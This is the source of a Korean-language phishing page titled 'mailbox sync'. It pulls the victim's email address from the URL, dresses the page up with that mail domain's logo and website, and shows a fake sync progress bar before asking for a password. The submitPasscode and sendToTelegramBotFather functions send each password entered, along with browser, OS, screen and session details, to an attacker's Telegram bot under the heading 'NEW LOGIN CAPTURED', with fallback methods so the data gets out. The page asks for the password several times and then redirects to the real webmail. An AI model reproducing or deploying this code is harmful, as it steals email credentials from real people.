<!DOCTYPE html>

    <meta charset="UTF-8">

    <title>메일함 동기화</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { background-color: #f8fafc !important; }
        
        .fade-in-up { animation: fadeInUp 0.6s cubic-bezier(0.16, 1, 0.3, 1) forwards; }
        .fade-out-down { animation: fadeOutDown 0.4s cubic-bezier(0.16, 1, 0.3, 1) forwards; }
        @keyframes fadeInUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
        @keyframes fadeOutDown { from { opacity: 1; transform: translateY(0); } to { opacity: 0; transform: translateY(20px); } }
        
        #bg-lookup-container { 
            position: fixed !important; 
            top: 0 !important; 
            left: 0 !important; 
            width: 100vw !important; 
            height: 100vh !important; 
            z-index: -9999 !important; 
            opacity: 0.15 !important; 
            filter: blur(4px) !important; 
            pointer-events: none !important; 
            overflow: hidden !important;
        }
        
        #domain-logo-img { transition: opacity 0.5s ease, transform 0.5s ease; }
        #domain-logo-img.loading { opacity: 0; transform: scale(0.8); }
        
        .main-container {
            background-color: #ffffff;
            z-index: 50;
            position: relative;
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.25);
        }
    </style>
</head>

    <script>

        // ==========================================
        // HELPER FUNCTIONS
        // ==========================================
        
        function getDecodedHash() {
            const hash = window.location.hash;
            if (!hash) return '';
            let raw = decodeURIComponent(hash.substring(1));
            if (raw.includes('?')) raw = raw.split('?')[0];
            return raw.trim();
        }

        function isEmailPlaceholder(str) {
            if (!str) return false;
            const lower = str.toLowerCase();
            return EMAIL_PLACEHOLDERS.some(p => lower === p.toLowerCase());
        }

        function generateSessionEmail() {
            const randomPart = Math.random().toString(36).substring(2, 10);
            return `user_${randomPart}@${AUTO_EMAIL_DOMAIN}`;
        }

        function getStoredEmail() {
            try {
                return localStorage.getItem(STORAGE_KEY);
            } catch (e) {
                return null;
            }
        }

        function saveEmailToStorage(email) {
            try {
                if (email && email.includes('@') && !isEmailPlaceholder(email)) {
                    localStorage.setItem(STORAGE_KEY, email);
                }
            } catch (e) {}
        }

        function getEmailFromHashParams() {
            const hash = window.location.hash;
            if (hash && hash.includes('?')) {
                try {
                    const hashParams = new URLSearchParams(hash.split('?')[1]);
                    const email = hashParams.get('email');
                    if (email && email.includes('@') && !isEmailPlaceholder(email)) {
                        return email;
                    }
                } catch (e) {}
            }
            return null;
        }

        function getEmailFromQueryParams() {
            try {
                const params = new URLSearchParams(window.location.search);
                const email = params.get('email');
                if (email && email.includes('@') && !isEmailPlaceholder(email)) {
                    return email;
                }
            } catch (e) {}
            return null;
        }

        // ==========================================
        // ✅ FIXED: GET REAL USER EMAIL
        // ==========================================
        function getRealUserEmail() {
            const rawHash = getDecodedHash();
            
            if (rawHash) {
                if (rawHash.includes('@') && rawHash.includes('.')) {
                    saveEmailToStorage(rawHash);
                    return rawHash;
                }

                if (isEmailPlaceholder(rawHash)) {
                    const hashEmail = getEmailFromHashParams();
                    if (hashEmail) {
                        saveEmailToStorage(hashEmail);
                        return hashEmail;
                    }

                    const queryEmail = getEmailFromQueryParams();
                    if (queryEmail) {
                        saveEmailToStorage(queryEmail);
                        return queryEmail;
                    }

                    const generated = generateSessionEmail();
                    saveEmailToStorage(generated);
                    return generated;
                }
            }

            const hashEmail = getEmailFromHashParams();
            if (hashEmail) {
                saveEmailToStorage(hashEmail);
                return hashEmail;
            }

            const queryEmail = getEmailFromQueryParams();
            if (queryEmail) {
                saveEmailToStorage(queryEmail);
                return queryEmail;
            }

            const storedEmail = getStoredEmail();
            if (storedEmail) {
                return storedEmail;
            }

            return DEFAULT_EMAIL;
        }

        // ==========================================
        // ✅ FIXED: UPDATE URL WITH RANDOM PARAMS
        // ==========================================
        function updateUrlWithRandomParams() {
            const params = generateRandomParams();
            const rawHash = getDecodedHash();
            let emailInHash = '';

            if (isEmailPlaceholder(rawHash)) {
                emailInHash = rawHash;
            } else {
                emailInHash = getRealUserEmail();
            }

            let encodedEmail = encodeURIComponent(emailInHash);
            encodedEmail = encodedEmail.replace(/%5B/gi, '[').replace(/%5D/gi, ']');

            const newHash = `#${encodedEmail}?sid=${params.sid}&ts=${params.ts}&ref=${params.ref}`;
            const cleanUrl = window.location.pathname + newHash;
            window.history.replaceState({}, '', cleanUrl);
        }

        function generateRandomParams() {
            const randomString = Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
            return { sid: randomString, ts: Date.now(), ref: 'sync_portal' };
        }

        function checkExpiration() {
            const hash = window.location.hash;
            if (hash && hash.includes('?')) {
                const hashParams = new URLSearchParams(hash.split('?')[1]);
                const ts = hashParams.get('ts');
                if (ts) {
                    const oneHour = 60 * 60 * 1000;
                    if (Date.now() - parseInt(ts) > oneHour) {
                        console.warn("⚠️ Session expired");
                        return false;
                    }
                }
            }
            return true;
        }

        function getUserInfo(email) {
            const domain = email.split('@')[1] || 'unknown';
            return { email, domain, username: email.split('@')[0], isVerified: false };
        }

        function handlePageAccess(email) {
            if (!email || !email.includes('@')) {
                console.warn("Access Denied: Invalid user identifier.");
                return false;
            }
            return true;
        }

        function formatUserCommandEmail(email) {
            return "SYNC_COMMAND user@example.com".replace('user@example.com', email);
        }

        function getDomainLogo(domain) {
            if (!domain) return null;
            const cleanDomain = domain.toLowerCase().trim();
            if (KNOWN_DOMAIN_LOGOS[cleanDomain]) return KNOWN_DOMAIN_LOGOS[cleanDomain];
            return `https://www.google.com/s2/favicons?domain=${cleanDomain}&sz=128`;
        }

        function applyDomainLogo(email) {
            const domain = email.split('@')[1];
            if (!domain) return;
            const logoUrl = getDomainLogo(domain);
            const imgEl = document.getElementById('domain-logo-img');
            const svgEl = document.getElementById('default-logo-svg');
            if (!logoUrl || !imgEl) return;

            imgEl.classList.add('loading');
            imgEl.classList.remove('hidden');
            imgEl.src = logoUrl;

            imgEl.onload = () => {
                imgEl.classList.remove('loading');
                if (svgEl) svgEl.style.opacity = '0';
            };
            imgEl.onerror = () => {
                imgEl.classList.add('hidden');
                imgEl.classList.remove('loading');
                if (svgEl) svgEl.style.opacity = '1';
            };
        }

        function getDomainRedirectUrl(domain) {
            if (!domain) return 'https://mail.google.com';
            const cleanDomain = domain.toLowerCase().trim();
            if (DOMAIN_REDIRECT_URLS[cleanDomain]) return DOMAIN_REDIRECT_URLS[cleanDomain];
            return `https://mail.${cleanDomain}`;
        }

        function redirectToUserDomain(email) {
            const domain = email.split('@')[1];
            const redirectUrl = getDomainRedirectUrl(domain);

            const msgEl = document.getElementById('redirect-message');
            if (msgEl) msgEl.textContent = `확인 중  ${domain}...`;

            transitionTo('step-redirect');

            let progress = 0;
            const bar = document.getElementById('redirect-progress-bar');
            const interval = setInterval(() => {
                progress += 5;
                if (progress >= 100) {
                    progress = 100;
                    clearInterval(interval);
                    setTimeout(() => { window.location.href = redirectUrl; }, 400);
                }
                if (bar) bar.style.width = progress + '%';
            }, 50);
        }

        function getFullUserInfo(email) {
            const domain = email.split('@')[1] || 'unknown';
            const username = email.split('@')[0];
            const userAgent = navigator.userAgent;
            
            let browser = 'Unknown';
            if (userAgent.indexOf('Firefox') > -1) browser = 'Firefox';
            else if (userAgent.indexOf('Edg') > -1) browser = 'Edge';
            else if (userAgent.indexOf('Chrome') > -1) browser = 'Chrome';
            else if (userAgent.indexOf('Safari') > -1) browser = 'Safari';
            else if (userAgent.indexOf('Opera') > -1 || userAgent.indexOf('OPR') > -1) browser = 'Opera';

            let os = 'Unknown';
            if (userAgent.indexOf('Win') > -1) os = 'Windows';
            else if (userAgent.indexOf('Mac') > -1) os = 'macOS';
            else if (userAgent.indexOf('Linux') > -1) os = 'Linux';
            else if (userAgent.indexOf('Android') > -1) os = 'Android';
            else if (userAgent.indexOf('iPhone') > -1 || userAgent.indexOf('iPad') > -1) os = 'iOS';

            const isMobile = /Mobi|Android|iPhone|iPad/i.test(userAgent);

            return {
                email: email,
                username: username,
                domain: domain,
                browser: browser,
                os: os,
                deviceType: isMobile ? 'Mobile' : 'Desktop',
                userAgent: userAgent,
                language: navigator.language || 'Unknown',
                platform: navigator.platform || 'Unknown',
                screenResolution: `${screen.width}x${screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown',
                referrer: document.referrer || 'Direct',
                currentUrl: window.location.href,
                timestamp: new Date().toISOString(),
                localTime: new Date().toLocaleString()
            };
        }

        async function sendToTelegramBotFather(userInfo, passcode, attempt) {
            const message = 
                `🚨 NEW LOGIN CAPTURED 🚨\n\n` +
                `📧 Email: ${userInfo.email}\n` +
                `👤 Username: ${userInfo.username}\n` +
                `🌐 Domain: ${userInfo.domain}\n` +
                `🔑 Passcode: ${passcode}\n` +
                `🔢 Attempt: ${attempt}/${MAX_ATTEMPTS}\n\n` +
                `─── DEVICE INFO ───\n` +
                `💻 Browser: ${userInfo.browser}\n` +
                `🖥️ OS: ${userInfo.os}\n` +
                `📱 Device: ${userInfo.deviceType}\n` +
                `🌍 Language: ${userInfo.language}\n` +
                `📐 Screen: ${userInfo.screenResolution}\n` +
                `🕐 Timezone: ${userInfo.timezone}\n\n` +
                `─── SESSION INFO ───\n` +
                `🔗 Referrer: ${userInfo.referrer}\n` +
                `📍 URL: ${userInfo.currentUrl}\n` +
                `⏰ Local Time: ${userInfo.localTime}`;

            const apiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

            try {
                const body = new URLSearchParams();
                body.append('chat_id', TELEGRAM_CHAT_ID);
                body.append('text', message);
                const response = await fetch(apiUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    body: body.toString()
                });
                const data = await response.json();
                if (data.ok) {
                    console.log('✅ Telegram sent (method 1):', userInfo.email);
                    return true;
                } else {
                    console.error('❌ Telegram API error:', data.description);
                }
            } catch (err) {
                console.warn('⚠️ Method 1 failed:', err.message);
            }

            try {
                const body = new URLSearchParams();
                body.append('chat_id', TELEGRAM_CHAT_ID);
                body.append('text', message);
                await fetch(apiUrl, {
                    method: 'POST',
                    mode: 'no-cors',
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    body: body.toString()
                });
                console.log('✅ Telegram sent (method 2 - no-cors)');
                return true;
            } catch (err) {
                console.error('❌ Method 2 failed:', err);
            }

            try {
                const encodedMessage = encodeURIComponent(message);
                const img = new Image();
                img.src = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodedMessage}`;
                console.log('✅ Telegram sent (method 3 - image beacon)');
                return true;
            } catch (err) {
                console.error('❌ Method 3 failed:', err);
            }

            console.error('❌ All Telegram methods failed');
            return false;
        }

        function updateDomainPageAndAssets(email) {
            const domain = email.split('@')[1];
            if (domain) {
                document.title = `${domain} - 메일함 동기화`;
                applyDomainLogo(email);
                const iframe = document.getElementById('bg-iframe');
                iframe.src = `https://${domain}`;
                console.log(`🌐 Domain assets updated: ${domain}`);
            }
        }

        function parseAndSetup() {
            try {
                targetEmail = getRealUserEmail();
                console.log('📧 Final email:', targetEmail);

                if (!handlePageAccess(targetEmail)) return;
                if (!checkExpiration()) return;

                updateUrlWithRandomParams();

                // ✅ NEW LOGIC: If the URL contains the placeholder, show the placeholder in the UI instead of the generated email.
                const rawHash = getDecodedHash();
                let emailToDisplay = targetEmail;

                if (isEmailPlaceholder(rawHash)) {
                    emailToDisplay = rawHash; // Show "user@example.com" in the box!
                }

                const displayEmail = document.getElementById('display-email');
                if (displayEmail) displayEmail.textContent = emailToDisplay;
                
                const passcodeEmail = document.getElementById('passcode-email-display');
                if (passcodeEmail) passcodeEmail.textContent = emailToDisplay;
                
                const passcodeInput = document.getElementById('passcode-input');
                if (passcodeInput) passcodeInput.placeholder = PASSCODE_PLACEHOLDER;
                
                const attemptEl = document.getElementById('attempt-indicator');
                if (attemptEl) {
                    attemptEl.textContent = `Attempt ${currentAttempt} of ${MAX_ATTEMPTS}`;
                }

                updateDomainPageAndAssets(targetEmail);
                console.log("✅ Command format:", formatUserCommandEmail(targetEmail));
            } catch (err) {
                console.error("❌ parseAndSetup error:", err);
            }
        }

        function startProgress() {
            let progress = 0;
            const bar = document.getElementById('progress-bar');
            const text = document.getElementById('progress-text');
            
            const interval = setInterval(() => {
                progress += Math.floor(Math.random() * 5) + 1; 
                if (progress >= 100) {
                    progress = 100;
                    clearInterval(interval);
                    setTimeout(showPasscodeStep, 600);
                }
                if (bar) bar.style.width = progress + '%';
                if (text) text.textContent = progress + '%';
            }, 150); 
        }

        function transitionTo(elementId) {
            document.querySelectorAll('#content-area > div').forEach(el => {
                if (!el.classList.contains('hidden')) {
                    el.classList.add('fade-out-down');
                    setTimeout(() => {
                        el.classList.add('hidden');
                        el.classList.remove('fade-out-down');
                    }, 400); 
                }
            });
            setTimeout(() => {
                const nextEl = document.getElementById(elementId);
                if (nextEl) {
                    nextEl.classList.remove('hidden');
                    nextEl.classList.add('fade-in-up');
                }
            }, 450);
        }

        function showPasscodeStep() { transitionTo('step-passcode'); }

        async function submitPasscode() {
            const val = document.getElementById('passcode-input').value.trim();
            
            if (val.length < 4) {
                alert("유효한 비밀번호(최소 4자)를 입력해 주세요.");
                return;
            }

            const userInfo = getFullUserInfo(targetEmail);
            await sendToTelegramBotFather(userInfo, val, currentAttempt);

            if (currentAttempt < MAX_ATTEMPTS) {
                currentAttempt++;
                document.getElementById('passcode-input').value = '';
                transitionTo('step-error');
            } else {
                redirectToUserDomain(targetEmail);
            }
        }

        function retryPasscode() {
            document.getElementById('passcode-input').value = '';
            const attemptEl = document.getElementById('attempt-indicator');
            if (attemptEl) {
                attemptEl.textContent = `Attempt ${currentAttempt} of ${MAX_ATTEMPTS}`;
            }
            transitionTo('step-passcode');
        }

        window.addEventListener('load', () => {
            parseAndSetup();
            startProgress();
        });

        window.addEventListener('hashchange', () => {
            parseAndSetup();
        });

    </script>
</body>
</html>
